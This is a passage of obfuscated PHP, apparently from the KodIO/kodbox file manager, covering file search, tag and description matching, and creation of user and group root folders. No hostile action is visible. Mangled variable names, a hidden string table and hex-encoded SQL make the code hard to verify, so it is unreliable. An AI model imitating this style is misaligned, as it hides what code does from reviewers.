$Øæ¹®œÛ =& $_SERVER[­õöî’–]; $ºÁ‚…â— = KodIO::fileTypeList(); $€ô¶Á‡î = $ºÁ‚…â—[$Ó÷¬Œ‹]; if (!$€ô¶Á‡î) { return array(); } $ùÍ¤ Á¸ = $€ô¶Á‡î[$Øæ¹®œÛ[174]]; $‘³–‚ëÅ = $Øæ¹®œÛ[7]; if (!$€ô¶Á‡î[$Øæ¹®œÛ[174]]) { $œÔ”ÇÁ = array_to_keyvalue($ºÁ‚…â—, $Øæ¹®œÛ[12], $Øæ¹®œÛ[174]); $ùÍ¤ Á¸ = implode($Øæ¹®œÛ[50], $œÔ”ÇÁ); $‘³–‚ëÅ = $Øæ¹®œÛ[2100]; } $ç¿ıÜ† = explode($Øæ¹®œÛ[50], trim($ùÍ¤ Á¸, $Øæ¹®œÛ[50])); return array($‘³–‚ëÅ, $ç¿ıÜ†); } public function listPathType($¾ğ“¥ Ü) { $³…‹Ó¥€ =& $_SERVER[­õöî’–]; $û¬½¯µ = $this->fileTypeWhere($¾ğ“¥ Ü); if (!$û¬½¯µ) { return array(); } $âˆ‡Éëş = USER_ID; $š†£Ôí‹ = Model($³…‹Ó¥€[535])->getInfo($âˆ‡Éëş); $šƒŒ‘É¼ = array($³…‹Ó¥€[586] => SourceModel::TYPE_USER, $³…‹Ó¥€[521] => array($³…‹Ó¥€[550], $³…‹Ó¥€[531] . $š†£Ôí‹[$³…‹Ó¥€[86]][$³…‹Ó¥€[402]] . $³…‹Ó¥€[551]), $³…‹Ó¥€[587] => $âˆ‡Éëş, $³…‹Ó¥€[583] => 0, $³…‹Ó¥€[584] => $û¬½¯µ); return $this->listSource($šƒŒ‘É¼); } public function listSearch($ó“Ïù¤­, $€§ŠòøÉ = 300) { $¡ÚÀ‹ºı =& $_SERVER[­õöî’–]; if (isset($ó“Ïù¤­[$¡ÚÀ‹ºı[1943]]) && $ó“Ïù¤­[$¡ÚÀ‹ºı[1943]]) { $ó“Ïù¤­[$¡ÚÀ‹ºı[1943]] = str_replace($¡ÚÀ‹ºı[384], $¡ÚÀ‹ºı[2101], trim($ó“Ïù¤­[$¡ÚÀ‹ºı[1943]])); } $¶ôåëÖ‰ = $this->_parseSearchWhere($ó“Ïù¤­); if (!isset($¶ôåëÖ‰[$¡ÚÀ‹ºı[431]])) { $¶ôåëÖ‰[$¡ÚÀ‹ºı[431]] = 0; } $µØ÷ó­• = $¡ÚÀ‹ºı[2102]; $‚Ï¿€æØ = $¶ôåëÖ‰; $é¹¡–Ó¥ = $µØ÷ó­•; $this->_listSearchBindPinyin($ó“Ïù¤­, $¶ôåëÖ‰, $µØ÷ó­•); $this->alias($¡ÚÀ‹ºı[446])->_makeOrder(); $¶ôåëÖ‰ = $this->parseWhereLike($¶ôåëÖ‰); $¨ñÚÇ–Á = $this->distinct(!0)->field($µØ÷ó­•)->where($¶ôåëÖ‰)->selectPage($€§ŠòøÉ); if ($GLOBALS[$¡ÚÀ‹ºı[6]][$¡ÚÀ‹ºı[381]][$¡ÚÀ‹ºı[382]] && Input::check($ó“Ïù¤­[$¡ÚÀ‹ºı[1943]], $¡ÚÀ‹ºı[593]) && $¨ñÚÇ–Á[$¡ÚÀ‹ºı[366]][$¡ÚÀ‹ºı[353]] == 1 && $¨ñÚÇ–Á[$¡ÚÀ‹ºı[366]][$¡ÚÀ‹ºı[367]] == 0) { $¨ñÚÇ–Á = $this->distinct(!0)->field($µØ÷ó­•)->where($‚Ï¿€æØ)->limit(1000)->select(); $¨ñÚÇ–Á = array_page_split($¨ñÚÇ–Á, !1, $€§ŠòøÉ); } $this->_listSearchFileContent($¨ñÚÇ–Á, $ó“Ïù¤­, $é¹¡–Ó¥, $‚Ï¿€æØ); $this->_listSearchDesc($¨ñÚÇ–Á, $ó“Ïù¤­, $é¹¡–Ó¥); $this->_listSearchTag($¨ñÚÇ–Á, $ó“Ïù¤­, $é¹¡–Ó¥); $this->_listSearchGroupTag($¨ñÚÇ–Á, $ó“Ïù¤­, $é¹¡–Ó¥); $this->_listDataApply($¨ñÚÇ–Á[$¡ÚÀ‹ºı[369]]); $this->_listMake($¨ñÚÇ–Á); return $¨ñÚÇ–Á; } private function _listSearchFileContent(&$Ú½¸ÄÆÙ, $ÅÂÙ¤âî, $«Û¬ °, $È„ÏËù™) { $Íä›‹·Ò =& $_SERVER[­õöî’–]; if (!$ÅÂÙ¤âî[$Íä›‹·Ò[1943]] || $Ú½¸ÄÆÙ[$Íä›‹·Ò[366]][$Íä›‹·Ò[353]] > 1) { return; } if (!isset($È„ÏËù™[$Íä›‹·Ò[32]]) || !is_array($ÅÂÙ¤âî[$Íä›‹·Ò[468]])) { return; } $È„ÏËù™[$Íä›‹·Ò[468]] = array($Íä›‹·Ò[7], $ÅÂÙ¤âî[$Íä›‹·Ò[468]]); unset($È„ÏËù™[$Íä›‹·Ò[32]]); unset($ÅÂÙ¤âî[$Íä›‹·Ò[468]]); $®ˆ›Ğ” = $this->field($«Û¬ °)->where($È„ÏËù™)->limit($Íä›‹·Ò[2103])->select(); if (!$®ˆ›Ğ” || count($®ˆ›Ğ”) == 0) { return; } $Ú½¸ÄÆÙ[$Íä›‹·Ò[369]] = array_merge($®ˆ›Ğ”, $Ú½¸ÄÆÙ[$Íä›‹·Ò[369]]); $Ú½¸ÄÆÙ[$Íä›‹·Ò[366]][$Íä›‹·Ò[367]] += count($®ˆ›Ğ”); } private function _listSearchTag(&$Ãš±»½á, $®™Ø‰†ğ, $¹á”°ñ‡) { $ÔË ïÛ“ =& $_SERVER[­õöî’–]; if (!$®™Ø‰†ğ[$ÔË ïÛ“[1943]] || $Ãš±»½á[$ÔË ïÛ“[366]][$ÔË ïÛ“[353]] > 1) { return; } $²›Í–æ¼ = Model($ÔË ïÛ“[2104])->listData(); $šÖï•Â = array(); $¥¯÷²›Ö = $®™Ø‰†ğ[$ÔË ïÛ“[1943]]; foreach ($²›Í–æ¼ as $¤¦ú¯Ö‡) { $Ü€Şá³ = $¤¦ú¯Ö‡[$ÔË ïÛ“[32]]; $ş¤­ Õ‰ = str_replace($ÔË ïÛ“[53], $ÔË ïÛ“[12], Pinyin::get($Ü€Şá³)); if (stripos($Ü€Şá³, $¥¯÷²›Ö) !== !1 || stripos($ş¤­ Õ‰, $¥¯÷²›Ö) !== !1) { $šÖï•Â[] = $¤¦ú¯Ö‡[$ÔË ïÛ“[399]]; } } if (!$šÖï•Â) { return; } $Ã²şæò = array($ÔË ïÛ“[426] => array($ÔË ïÛ“[7], $šÖï•Â), $ÔË ïÛ“[1660] => USER_ID); $í¼Óãı = Model($ÔË ïÛ“[428])->field($ÔË ïÛ“[84])->where($Ã²şæò)->select(); $í¼Óãı = array_to_keyvalue($í¼Óãı, $ÔË ïÛ“[12], $ÔË ïÛ“[84]); $ ¼Ë½ä = array_unique($í¼Óãı); $this->_listSearchMerge($Ãš±»½á, $®™Ø‰†ğ, $¹á”°ñ‡, $ ¼Ë½ä); } private function _listSearchDesc(&$ÁãšÅŸÔ, $˜êÅ¢ä, $ÇÜÉÎÇÙ) { $Ê¯ôßÕ  =& $_SERVER[­õöî’–]; if (!$˜êÅ¢ä[$Ê¯ôßÕ [1943]] || $ÁãšÅŸÔ[$Ê¯ôßÕ [366]][$Ê¯ôßÕ [353]] > 1) { return; } $ÖËÇ±È = array($Ê¯ôßÕ [94] => $Ê¯ôßÕ [453], $Ê¯ôßÕ [374] => array($Ê¯ôßÕ [383], $Ê¯ôßÕ [1945] . $˜êÅ¢ä[$Ê¯ôßÕ [1943]] . $Ê¯ôßÕ [1945])); $¿¥¿è¹’ = !1; if ($¿¥¿è¹’) { $¹‹ĞÒµ = $this->listSearchChildren($˜êÅ¢ä[$Ê¯ôßÕ [432]]); $¹‹ĞÒµ = array_unique($¹‹ĞÒµ); if (!$¹‹ĞÒµ) { return; } $ÖËÇ±È[$Ê¯ôßÕ [402]] = array($Ê¯ôßÕ [7], $¹‹ĞÒµ); } $“ÉŞ¤Îò = Model($Ê¯ôßÕ [569])->field($Ê¯ôßÕ [402])->where($ÖËÇ±È)->limit(5000)->select(); $ÆÕ»×ï = array_to_keyvalue($“ÉŞ¤Îò, $Ê¯ôßÕ [12], $Ê¯ôßÕ [402]); $this->_listSearchMerge($ÁãšÅŸÔ, $˜êÅ¢ä, $ÇÜÉÎÇÙ, $ÆÕ»×ï); } private function _listSearchGroupTag(&$Âô•¬”, $öÁÜ†ø‘, $½ÃÍë’ç) { $¥ışÁÅ° =& $_SERVER[­õöî’–]; if (!$öÁÜ†ø‘[$¥ışÁÅ°[1943]] || $Âô•¬”[$¥ışÁÅ°[366]][$¥ışÁÅ°[353]] > 1 || !$öÁÜ†ø‘[$¥ışÁÅ°[432]]) { return; } $Íï×Œ¶Ÿ = $this->sourceInfo($öÁÜ†ø‘[$¥ışÁÅ°[432]]); if (!$Íï×Œ¶Ÿ || $Íï×Œ¶Ÿ[$¥ışÁÅ°[411]] != SourceModel::TYPE_GROUP) { return; } $§Å¨¶©ú = $Íï×Œ¶Ÿ[$¥ışÁÅ°[505]]; $«Îûş¹ = Model($¥ışÁÅ°[2105])->get($§Å¨¶©ú); $„Ì¥ıêı = array(); $ı¶¥÷ùÏ = $öÁÜ†ø‘[$¥ışÁÅ°[1943]]; foreach ($«Îûş¹[$¥ışÁÅ°[369]] as $ëáĞÔÚ¾) { $ÒÜœ¯ö… = $ëáĞÔÚ¾[$¥ışÁÅ°[32]]; $« €¯ø‘ = str_replace($¥ışÁÅ°[53], $¥ışÁÅ°[12], Pinyin::get($ÒÜœ¯ö…)); if (stripos($ÒÜœ¯ö…, $ı¶¥÷ùÏ) !== !1 || stripos($« €¯ø‘, $ı¶¥÷ùÏ) !== !1) { $„Ì¥ıêı[] = $ëáĞÔÚ¾[$¥ışÁÅ°[399]]; } } if (!$„Ì¥ıêı) { return; } $ùîšÜÌ = array($¥ışÁÅ°[426] => array($¥ışÁÅ°[7], $„Ì¥ıêı), $¥ışÁÅ°[1660] => 0, $¥ışÁÅ°[33] => $¥ışÁÅ°[1965] . $§Å¨¶©ú); $…ä›°—• = Model($¥ışÁÅ°[428])->field($¥ışÁÅ°[84])->where($ùîšÜÌ)->select(); $…ä›°—• = array_to_keyvalue($…ä›°—•, $¥ışÁÅ°[12], $¥ışÁÅ°[84]); $ë×—Àúä = array_unique($…ä›°—•); $this->_listSearchMerge($Âô•¬”, $öÁÜ†ø‘, $½ÃÍë’ç, $ë×—Àúä); } private function _listSearchMerge(&$Ó´Ş×¸, $çÒË¥÷Œ, $×„Ä€™—, $‰ß¾ş˜) { $¦Ä¹±æÕ =& $_SERVER[­õöî’–]; if (!$‰ß¾ş˜) { return; } $€ä´Ÿ¼† = array_to_keyvalue($Ó´Ş×¸[$¦Ä¹±æÕ[369]], $¦Ä¹±æÕ[12], $¦Ä¹±æÕ[402]); $‡Ëé²Ñ = array_diff($‰ß¾ş˜, $€ä´Ÿ¼†); if (!$‡Ëé²Ñ) { return; } $Ã¿¢·…» = array($¦Ä¹±æÕ[402] => array($¦Ä¹±æÕ[7], $‡Ëé²Ñ)); $ÇãØ¯×¥ = $this->field($×„Ä€™—)->where($Ã¿¢·…»)->select(); if (!$ÇãØ¯×¥) { return; } $’Á®ºîµ = array(); foreach ($ÇãØ¯×¥ as $èĞ¿÷¬) { if ($this->_listSearchFilter($èĞ¿÷¬, $çÒË¥÷Œ)) { $’Á®ºîµ[] = $èĞ¿÷¬; } } $Ó´Ş×¸[$¦Ä¹±æÕ[369]] = array_merge($’Á®ºîµ, $Ó´Ş×¸[$¦Ä¹±æÕ[369]]); $Ó´Ş×¸[$¦Ä¹±æÕ[366]][$¦Ä¹±æÕ[367]] += count($’Á®ºîµ); } private function _listSearchFilter($§ÛÃõµ„, $íÃó‹Ñ¹) { $Üû³ïáë =& $_SERVER[­õöî’–]; $ÁëËŠÑ = $§ÛÃõµ„[$Üû³ïáë[410]] == $Üû³ïáë[88]; if (!strstr($§ÛÃõµ„[$Üû³ïáë[521]], $Üû³ïáë[50] . $íÃó‹Ñ¹[$Üû³ïáë[432]] . $Üû³ïáë[50])) { return !1; } if (isset($íÃó‹Ñ¹[$Üû³ïáë[412]]) && $íÃó‹Ñ¹[$Üû³ïáë[412]] != $Üû³ïáë[1904]) { if ($íÃó‹Ñ¹[$Üû³ïáë[412]] == $Üû³ïáë[75] && !$ÁëËŠÑ) { return !1; } if ($íÃó‹Ñ¹[$Üû³ïáë[412]] != $Üû³ïáë[75] && $ÁëËŠÑ) { return !1; } if (!strstr($§ÛÃõµ„[$Üû³ïáë[174]], $Üû³ïáë[50] . $íÃó‹Ñ¹[$Üû³ïáë[412]] . $Üû³ïáë[50])) { return !1; } } if (isset($íÃó‹Ñ¹[$Üû³ïáë[2106]]) && $íÃó‹Ñ¹[$Üû³ïáë[2106]] < $§ÛÃõµ„[$Üû³ïáë[76]]) { return !1; } if (isset($íÃó‹Ñ¹[$Üû³ïáë[2107]]) && $íÃó‹Ñ¹[$Üû³ïáë[2107]] > $§ÛÃõµ„[$Üû³ïáë[76]]) { return !1; } if (isset($íÃó‹Ñ¹[$Üû³ïáë[600]]) && $íÃó‹Ñ¹[$Üû³ïáë[600]] != $§ÛÃõµ„[$Üû³ïáë[456]]) { return !1; } return !0; } public function listSearchChildren($şıÂüÃ, $Õ†¡„¡® = 5000) { $ñú¶ÅÛÚ =& $_SERVER[­õöî’–]; $ÉæóÜ¦Ø = array(); $é­¹äÉ¸ = $this->sourceInfo($şıÂüÃ); $ºå§İ†— = array($ñú¶ÅÛÚ[521] => array($ñú¶ÅÛÚ[383], $é­¹äÉ¸[$ñú¶ÅÛÚ[521]] . $é­¹äÉ¸[$ñú¶ÅÛÚ[402]] . $ñú¶ÅÛÚ[551])); $ğ¨êØ¡³ = $this->field($ñú¶ÅÛÚ[76])->where($ºå§İ†—)->limit($Õ†¡„¡® + 1)->select(); $ÖÌñÛá = is_array($ğ¨êØ¡³) ? count($ğ¨êØ¡³) : 0; if ($ÖÌñÛá > $Õ†¡„¡®) { return $this->_listSearchChildrenNear($şıÂüÃ, $Õ†¡„¡®); } $¨·ï¦í = $this->field($ñú¶ÅÛÚ[402])->where($ºå§İ†—)->select(); $ÉæóÜ¦Ø = array_to_keyvalue($¨·ï¦í, $ñú¶ÅÛÚ[12], $ñú¶ÅÛÚ[402]); return $ÉæóÜ¦Ø; } private function _listSearchChildrenNear($¯‚˜´”Ğ, $ëÉŒÇ¼Â) { $–íõÄå =& $_SERVER[­õöî’–]; $ù‘£Â¦æ = array(); $¯¦åü‡ = array($–íõÄå[432] => $¯‚˜´”Ğ); $¦ÌŒş° = $this->field($–íõÄå[2108])->where($¯¦åü‡)->select(); $‰‚‰ñå¾ = array_to_keyvalue(array_filter_by_field($¦ÌŒş°, $–íõÄå[410], $–íõÄå[88]), $–íõÄå[12], $–íõÄå[402]); $ù‘£Â¦æ = array_merge($ù‘£Â¦æ, array_to_keyvalue($¦ÌŒş°, $–íõÄå[12], $–íõÄå[402])); if (!$‰‚‰ñå¾) { return $ù‘£Â¦æ; } $¯¦åü‡ = array($–íõÄå[432] => array($–íõÄå[7], $‰‚‰ñå¾)); $¦ÌŒş° = $this->field($–íõÄå[2108])->where($¯¦åü‡)->limit($ëÉŒÇ¼Â)->select(); $ù‘£Â¦æ = array_merge($ù‘£Â¦æ, array_to_keyvalue($¦ÌŒş°, $–íõÄå[12], $–íõÄå[402])); $ù‘£Â¦æ = array_slice($ù‘£Â¦æ, 0, $ëÉŒÇ¼Â); return $ù‘£Â¦æ; } private function _listSearchBindPinyin($‚‘ï­ÓÈ, &$‘ùæ®±è, &$Ôñ°Ù ) { $­­äèÍè =& $_SERVER[­õöî’–]; if (!isset($‚‘ï­ÓÈ[$­­äèÍè[1943]]) || !$‚‘ï­ÓÈ[$­­äèÍè[1943]]) { return; } if (!Input::check($‚‘ï­ÓÈ[$­­äèÍè[1943]], $­­äèÍè[318]) || strlen($‚‘ï­ÓÈ[$­­äèÍè[1943]]) < 2) { return; } $½ÅÜªó¤ = "\x4c\105\x46\x54\40\112\x4f\x49\x4e\x20{$this->tablePrefix}\x69\x6f\137\x73\x6f\165\x72\143\x65\x5f\155\145\164\x61\x20\x6d\x65\164\x61\x20\157\x6e\40\163\x6f\165\x72\143\x65\x2e\x73\x6f\x75\x72\143\x65\111\104\x20\x3d\x20\x6d\145\x74\x61\x2e\163\157\x75\x72\x63\145\x49\x44"; $×Ê¨–§Í = array(); $Ôñ°Ù  = str_replace(array($­­äèÍè[231], $­­äèÍè[53], $­­äèÍè[2109]), $­­äèÍè[12], $Ôñ°Ù ); $Ôñ°Ù  = $­­äèÍè[438] . str_replace($­­äèÍè[50], $­­äèÍè[439], $Ôñ°Ù ); $ÚÉ™õİ = $‘ùæ®±è[$­­äèÍè[32]]; unset($‘ùæ®±è[$­­äèÍè[32]]); foreach ($‘ùæ®±è as $ğâêêê² => $òĞ½ú’«) { $×Ê¨–§Í[$­­äèÍè[438] . $ğâêêê²] = $òĞ½ú’«; } foreach ($ÚÉ™õİ as $ôœÖ´©À) { $×Ê¨–§Í[] = array($­­äèÍè[443] => $ôœÖ´©À, $­­äèÍè[998] => $­­äèÍè[1947], array($­­äèÍè[2110] => $ôœÖ´©À, $­­äèÍè[2111] => array($­­äèÍè[7], array($­­äèÍè[465], $­­äèÍè[464])))); } $this->join($½ÅÜªó¤); $‘ùæ®±è = $×Ê¨–§Í; } private function _parseSearchWhere($¢î£äœÆ) { $Ü¿ß˜† =& $_SERVER[­õöî’–]; $‡ïãŒ‚£ = array(); if (isset($¢î£äœÆ[$Ü¿ß˜†[752]]) && $¢î£äœÆ[$Ü¿ß˜†[752]]) { $‡ïãŒ‚£[$Ü¿ß˜†[85]] = array($Ü¿ß˜†[2112], $¢î£äœÆ[$Ü¿ß˜†[752]]); } if (isset($¢î£äœÆ[$Ü¿ß˜†[497]]) && $¢î£äœÆ[$Ü¿ß˜†[497]]) { $ÚäñÅ»Ş = array($Ü¿ß˜†[2113], $¢î£äœÆ[$Ü¿ß˜†[497]]); if ($‡ïãŒ‚£[$Ü¿ß˜†[85]]) { $‡ïãŒ‚£[$Ü¿ß˜†[85]] = array($‡ïãŒ‚£[$Ü¿ß˜†[85]], $ÚäñÅ»Ş, $Ü¿ß˜†[2114]); } else { $‡ïãŒ‚£[$Ü¿ß˜†[85]] = $ÚäñÅ»Ş; } } if (isset($¢î£äœÆ[$Ü¿ß˜†[2106]]) && $¢î£äœÆ[$Ü¿ß˜†[2106]] > 0) { $‡ïãŒ‚£[$Ü¿ß˜†[76]] = array($Ü¿ß˜†[2112], $¢î£äœÆ[$Ü¿ß˜†[2106]]); } if (isset($¢î£äœÆ[$Ü¿ß˜†[2107]]) && $¢î£äœÆ[$Ü¿ß˜†[2107]]) { $ÚäñÅ»Ş = array($Ü¿ß˜†[2113], $¢î£äœÆ[$Ü¿ß˜†[2107]]); if ($‡ïãŒ‚£[$Ü¿ß˜†[76]]) { $‡ïãŒ‚£[$Ü¿ß˜†[76]] = array($‡ïãŒ‚£[$Ü¿ß˜†[76]], $ÚäñÅ»Ş, $Ü¿ß˜†[2114]); } else { $‡ïãŒ‚£[$Ü¿ß˜†[76]] = $ÚäñÅ»Ş; } } if (isset($¢î£äœÆ[$Ü¿ß˜†[600]]) && $¢î£äœÆ[$Ü¿ß˜†[600]]) { $‡ïãŒ‚£[] = array($Ü¿ß˜†[456] => $¢î£äœÆ[$Ü¿ß˜†[600]], $Ü¿ß˜†[454] => $¢î£äœÆ[$Ü¿ß˜†[600]], $Ü¿ß˜†[998] => $Ü¿ß˜†[1947]); } if (isset($¢î£äœÆ[$Ü¿ß˜†[412]]) && $¢î£äœÆ[$Ü¿ß˜†[412]]) { $§¸¶ïá÷ = $¢î£äœÆ[$Ü¿ß˜†[412]]; if ($§¸¶ïá÷ == $Ü¿ß˜†[75]) { $‡ïãŒ‚£[$Ü¿ß˜†[410]] = 1; } else { if ($§¸¶ïá÷ == $Ü¿ß˜†[2115]) { $‡ïãŒ‚£[$Ü¿ß˜†[410]] = 0; } else { if ($§¸¶ïá÷) { $§¸¶ïá÷ = is_array($§¸¶ïá÷) ? $§¸¶ïá÷ : explode($Ü¿ß˜†[50], $§¸¶ïá÷); $‡ïãŒ‚£[$Ü¿ß˜†[412]] = array($Ü¿ß˜†[418], $§¸¶ïá÷); $‡ïãŒ‚£[$Ü¿ß˜†[410]] = 0; } } } } $this->_parseSearchParent($¢î£äœÆ, $‡ïãŒ‚£); if (isset($¢î£äœÆ[$Ü¿ß˜†[1943]]) && trim($¢î£äœÆ[$Ü¿ß˜†[1943]])) { $òÉßò©‹ = trim($¢î£äœÆ[$Ü¿ß˜†[1943]]); $Ú£õ¢ó = explode($Ü¿ß˜†[53], $òÉßò©‹); if (strlen($òÉßò©‹) > 2 && (substr($òÉßò©‹, 0, 1) == $Ü¿ß˜†[118] && substr($òÉßò©‹, -1) == $Ü¿ß˜†[118]) || substr($òÉßò©‹, 0, 1) == $Ü¿ß˜†[58] && substr($òÉßò©‹, -1) == $Ü¿ß˜†[58]) { $òÉßò©‹ = substr($òÉßò©‹, 1, -1); $Ú£õ¢ó = array($òÉßò©‹); } $‡ïãŒ‚£[$Ü¿ß˜†[32]] = array(array($Ü¿ß˜†[550], $Ü¿ß˜†[1945] . $òÉßò©‹ . $Ü¿ß˜†[1945])); if (count($Ú£õ¢ó) > 1) { $‡ïãŒ‚£[$Ü¿ß˜†[32]] = array(); foreach ($Ú£õ¢ó as $¥ãª°) { if (!trim($¥ãª°)) { continue; } $‡ïãŒ‚£[$Ü¿ß˜†[32]][] = array($Ü¿ß˜†[550], $Ü¿ß˜†[1945] . trim($¥ãª°) . $Ü¿ß˜†[1945]); } } } return $‡ïãŒ‚£; } private function _parseSearchParent($èÌ£±Ù…, &$©•µùÒŒ) { $ÏÔ…´‘è =& $_SERVER[­õöî’–]; if (!isset($èÌ£±Ù…[$ÏÔ…´‘è[432]]) || !$èÌ£±Ù…[$ÏÔ…´‘è[432]]) { return; } $…÷§µö€ = $this->pathInfo($èÌ£±Ù…[$ÏÔ…´‘è[432]]); $êëÄÖŞ = $…÷§µö€[$ÏÔ…´‘è[432]] . $ÏÔ…´‘è[12] === $ÏÔ…´‘è[197]; $’‹ä­ÊÇ = $…÷§µö€[$ÏÔ…´‘è[411]] == $ÏÔ…´‘è[515]; if ($…÷§µö€[$ÏÔ…´‘è[532]] == $ÏÔ…´‘è[533]) { $‘Å÷íø = $this->sourceInfo($èÌ£±Ù…[$ÏÔ…´‘è[432]]); $…÷§µö€[$ÏÔ…´‘è[521]] = $‘Å÷íø[$ÏÔ…´‘è[521]]; } $©•µùÒŒ[$ÏÔ…´‘è[590]] = array($ÏÔ…´‘è[550], $…÷§µö€[$ÏÔ…´‘è[521]] . $èÌ£±Ù…[$ÏÔ…´‘è[432]] . $ÏÔ…´‘è[551]); $óÛ‚İş = isset($èÌ£±Ù…[$ÏÔ…´‘è[1808]]) && in_array($ÏÔ…´‘è[515], $èÌ£±Ù…[$ÏÔ…´‘è[1808]]); if (!$óÛ‚İş || !$’‹ä­ÊÇ || !$êëÄÖŞ || !$…÷§µö€[$ÏÔ…´‘è[413]]) { return; } if (!AuthModel::authCheckRoot($…÷§µö€[$ÏÔ…´‘è[413]][$ÏÔ…´‘è[414]])) { return; } $¡öïÈ = $…÷§µö€[$ÏÔ…´‘è[505]] . $ÏÔ…´‘è[12]; if ($¡öïÈ == $ÏÔ…´‘è[88]) { unset($©•µùÒŒ[$ÏÔ…´‘è[590]]); $©•µùÒŒ[$ÏÔ…´‘è[411]] = self::TYPE_GROUP; return; } $ºÕÈÖÔÀ = Model($ÏÔ…´‘è[522])->groupChildrenAll($¡öïÈ); $ÔÖ…ùäÊ = count($ºÕÈÖÔÀ); if ($ÔÖ…ùäÊ <= 1) { return; } $¼Âïˆßµ = array($ÏÔ…´‘è[432] => 0, $ÏÔ…´‘è[411] => self::TYPE_GROUP, $ÏÔ…´‘è[505] => array($ÏÔ…´‘è[7], $ºÕÈÖÔÀ)); $¡êˆ‰ = $this->field($ÏÔ…´‘è[2116])->where($¼Âïˆßµ)->limit($ÔÖ…ùäÊ)->select(); $©•µùÒŒ[$ÏÔ…´‘è[590]] = array(); foreach ($¡êˆ‰ as $ï×šàš•) { $©•µùÒŒ[$ÏÔ…´‘è[590]][] = array($ÏÔ…´‘è[550], $ÏÔ…´‘è[531] . $ï×šàš•[$ÏÔ…´‘è[402]] . $ÏÔ…´‘è[551]); } $©•µùÒŒ[$ÏÔ…´‘è[590]][] = $ÏÔ…´‘è[1947]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ô‡»†ú) { $²ªğüßÏ =& $_SERVER[­õöî’–]; $Ñ€•Ñ¶ë = Model($²ªğüßÏ[513])->where(array($²ªğüßÏ[1651] => $ô‡»†ú))->find(); $ÄÖôÔ† = $this->_mkdirRoot(SourceModel::TYPE_USER, $ô‡»†ú, $Ñ€•Ñ¶ë[$²ªğüßÏ[32]]); $this->userDesktopAdd($ÄÖôÔ†); return $ÄÖôÔ†; } public function userDesktopAdd($ï¨íœ³) { $©ºçÒñÏ =& $_SERVER[­õöî’–]; $¨úº©ÒĞ = LNG($©ºçÒñÏ[2117]); $Ç¸Ş‰ÕÄ = $this->mkdir($ï¨íœ³, $¨úº©ÒĞ); $this->metaSet($Ç¸Ş‰ÕÄ, $©ºçÒñÏ[2118], $©ºçÒñÏ[88]); $this->metaSet($ï¨íœ³, $©ºçÒñÏ[2119], $Ç¸Ş‰ÕÄ); } public function userPathSafeAdd($Çç°ˆ¨) { $†ş«¸ =& $_SERVER[­õöî’–]; $·¶Ê«¢ü = Model($†ş«¸[513])->getInfoFull($Çç°ˆ¨); if (!$·¶Ê«¢ü) { return !1; } if (_get($·¶Ê«¢ü, $†ş«¸[536])) { return $·¶Ê«¢ü[$†ş«¸[466]][$†ş«¸[2120]]; } $Ø³—éıê = $this->_mkdirRoot(SourceModel::TYPE_USER, $Çç°ˆ¨, $†ş«¸[2121], $†ş«¸[433]); Model($†ş«¸[513])->metaSet($Çç°ˆ¨, $†ş«¸[2120], $Ø³—éıê); $this->metaSet($Ø³—éıê, $†ş«¸[2122], $Çç°ˆ¨); return $Ø³—éıê; } public function groupRootAdd($„ÇñÀö®) { $»ğ™ëĞ =& $_SERVER[­õöî’–]; $¼’ó‘Áå = Model($»ğ™ëĞ[522])->where(array($»ğ™ëĞ[1937] => $„ÇñÀö®))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $„ÇñÀö®, $¼’ó‘Áå[$»ğ™ëĞ[32]]); } public function systemRootPathAdd($È‚óñ‡á) { if ($È‚óñ‡á != $_SERVER[­õöî’–][544]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $È‚óñ‡á); } public function userRootRemove($Ÿ’›‡Ğ§) { $•ù¸ÓŸ = $this->targetSourceRoot(SourceModel::TYPE_USER, $Ÿ’›‡Ğ§, !0); foreach ($•ù¸ÓŸ as $èÉä‹Â€) { if (!$èÉä‹Â€) { continue; } $this->remove($èÉä‹Â€[$_SERVER[­õöî’–][402]], !1); } } public function groupRootRemove($¯«´èƒ) { $¡ê ş€– = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $¯«´èƒ); if (!$¡ê ş€–) { return; } $this->remove($¡ê ş€–[$_SERVER[­õöî’–][402]], !1); } private function _mkdirRoot($¡ûø¨®Ò, $ò½ôÅË, $§œ·Û–¸, $Ş±¢è¤ó = '') { $ÖÚÖ¯ =& $_SERVER[­õöî’–]; $ƒß¿‘»Ê = array($ÖÚÖ¯[401] => 0, $ÖÚÖ¯[586] => $¡ûø¨®Ò, $ÖÚÖ¯[587] => $ò½ôÅË, $ÖÚÖ¯[583] => 1, $ÖÚÖ¯[588] => USER_ID, $ÖÚÖ¯[589] => USER_ID, $ÖÚÖ¯[584] => $Ş±¢è¤ó, $ÖÚÖ¯[590] => $ÖÚÖ¯[531], $ÖÚÖ¯[430] => 0, $ÖÚÖ¯[585] => 0, $ÖÚÖ¯[469] => 0, $ÖÚÖ¯[591] => $ÖÚÖ¯[12]); if ($í•óöŞ = $this->where($ƒß¿‘»Ê)->find()) { return $í•óöŞ[$ÖÚÖ¯[402]]; } $¨ïÛ¤Õö = "\115\x6f\144\x65\x6c\123\157\x75\x72\x63\x65\x2e\155\153\x64\x69\x72\x52\157\157\x74\x2e{$¡ûø¨®Ò}\x2e{$ò½ôÅË}\x2e" . $§œ·Û–¸; CacheLock::lock($¨ïÛ¤Õö); $ƒß¿‘»Ê[$ÖÚÖ¯[32]] = $§œ·Û–¸; $á’±Ë¹ = $this->add($ƒß¿‘»Ê); $É–áöà = array($ÖÚÖ¯[592] => short_id($á’±Ë¹)); $this->where(array($ÖÚÖ¯[417] => $á’±Ë¹))->save($É–áöà); CacheLock::unlock($¨ïÛ¤Õö); return $á’±Ë¹; } private function targetSourceRoot($¯«Ô½»õ, $éÎìë©¬, $å¿ô¼”ü = false) { $Áğâ¾Úà =& $_SERVER[­õöî’–]; $”Ö‹™Â³ = array($Áğâ¾Úà[401] => 0, $Áğâ¾Úà[586] => $¯«Ô½»õ, $Áğâ¾Úà[587] => $éÎìë©¬); if ($å¿ô¼”ü) { $ıÙœ™ö = $this->where($”Ö‹™Â³)->select(); return $ıÙœ™ö ? $ıÙœ™ö : array(); } $§Ÿùñª = $this->where($”Ö‹™Â³)->find(); return $§Ÿùñª ? $§Ÿùñª : array(); } public function sourceRootGroup($€çµîá„) { $²‹«»ĞÖ =& $_SERVER[­õöî’–]; if (is_string($€çµîá„)) { $€çµîá„ = array($€çµîá„); } $Ä ™çöÔ = 